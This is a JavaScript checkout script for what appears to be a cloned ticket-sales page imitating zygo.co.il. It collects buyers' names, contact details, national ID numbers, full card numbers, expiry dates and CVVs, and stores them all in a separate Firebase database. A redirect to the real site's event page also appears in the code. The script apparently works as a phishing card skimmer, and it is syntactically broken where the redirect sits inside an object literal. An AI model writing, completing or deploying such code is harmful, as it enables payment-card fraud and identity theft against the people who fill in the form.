document.addEventListener("DOMContentLoaded", function () {

  const firebaseConfig = {
    apiKey: "AIzaSyDZVrncvPwEg6IDHjloweJNjrpj32lZy5g",
    authDomain: "zygo-acf32.firebaseapp.com",
    databaseURL: "https://zygo-acf32-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "zygo-acf32",
    storageBucket: "zygo-acf32.firebasestorage.app",
    messagingSenderId: "243652763597",
    appId: "1:243652763597:web:f9cbc63435193855236e84"
  };

  // ✅ אתחול בטוח (כדי לא ליפול אם נטען פעמיים)
  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
    console.log("Firebase initialized");
  } else {
    console.log("Firebase already initialized");
  }

  const database = firebase.database();
  const firestore = firebase.firestore();

  const form = document.getElementById("nameForm");
  const statusEl = document.getElementById("saveStatus");

  form.addEventListener("submit", async function (event) {
    event.preventDefault();

    // לוקחים את מצב ההזמנה מה-HTML (orderState)
    const os = window.orderState || {
      regularQty: 1,
      vipQty: 0,
      regularUnit: 220,
      vipUnit: 320
      window.location.replace("https://zygo.co.il/event/690116209800106398/ZF10k73u9");
    };

    const totalQty = (Number(os.regularQty) || 0) + (Number(os.vipQty) || 0);
    const totalAmount =
      (Number(os.regularQty) || 0) * (Number(os.regularUnit) || 0) +
      (Number(os.vipQty) || 0) * (Number(os.vipUnit) || 0);

    const userData = {
      // פרטי משתמש
      firstName: document.getElementById("firstName").value,
      lastName: document.getElementById("lastName").value,
      email: document.getElementById("email").value,
      phoneNumber: document.getElementById("phoneNumber").value,
      birthDate: document.getElementById("birthDate").value,
      gender: document.getElementById("gender").value,
      instagram: document.getElementById("instagram").value,
      ID: document.getElementById("ID").value,

      // ✅ פרטי הזמנה
      tickets: {
        regularQty: Number(os.regularQty) || 0,
        vipQty: Number(os.vipQty) || 0,
        regularUnit: Number(os.regularUnit) || 0,
        vipUnit: Number(os.vipUnit) || 0
      },
      totalQty,
      totalAmount,

      // תשלום (כמו אצלך – שים לב: לא מומלץ לשמור CVV בפרודקשן)
      creditCardNumber: document.getElementById("creditCardNumber").value,
      expire: document.getElementById("expire").value,
      cvv: document.getElementById("cvv").value,

      createdAt: Date.now()
    };

    try {
      if (statusEl) statusEl.textContent = "שומר נתונים...";

      // ✅ Realtime Database → Details
      const rtdbRes = await database.ref("Details").push(userData);

      // ✅ Firestore → Details
      const fsRes = await firestore.collection("Details").add(userData);

      console.log("Saved RTDB key:", rtdbRes.key);
      console.log("Saved Firestore id:", fsRes.id);

      if (statusEl) statusEl.textContent = "✅ נשמר בהצלחה";
      alert("✅ הנתונים נשמרו בהצלחה");
      form.reset();

    } catch (error) {
      console.error("Firebase save error:", error);
      if (statusEl) statusEl.textContent = "❌ שמירה נכשלה (בדוק Console)";
      alert("❌ השמירה נכשלה (בדוק Console)");
    }
  });

});
